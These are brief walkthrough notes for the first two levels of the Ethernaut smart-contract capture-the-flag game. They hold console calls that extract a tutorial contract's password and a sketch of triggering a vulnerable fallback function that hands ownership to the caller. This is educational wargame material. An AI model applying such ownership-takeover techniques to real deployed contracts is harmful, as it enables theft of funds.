https://blog.trailofbits.com/2017/11/06/hands-on-the-ethernaut-ctf/

## [1. Hello](https://ethernaut.zeppelin.solutions/)

```javascript
help()
await contract.info1()
"Try info2(), but with "hello" as a parameter."
await contract.info2("hello")
"The property infoNum holds the number of the next info method to call."
a = await contract.infoNum()
{s: 1, e: 1, c: [42]}
await contract.info42()
"theMethodName is the name of the next method."
await contract.theMethodName()
"The method name is method7123949."
await contract.method7123949()
"If you know the password, submit it to authenticate()."
p = await contract.password()
await contract.authenticate(p)
```

## [2. Fallback](https://ethernaut.zeppelin.solutions/level/0x234094aac85628444a82dae0396c680974260be7)
```
contract["abi"][7] # the callback function
// let call the contract with non-existing function name to trigger the callback
await contract.fkddkeokdowei()
```
```javascript
  function() payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
https://ethernaut.zeppelin.solutions/help
Use Remix to write the code and deploy it in the conrresponding network See Remix Solidity IDE.
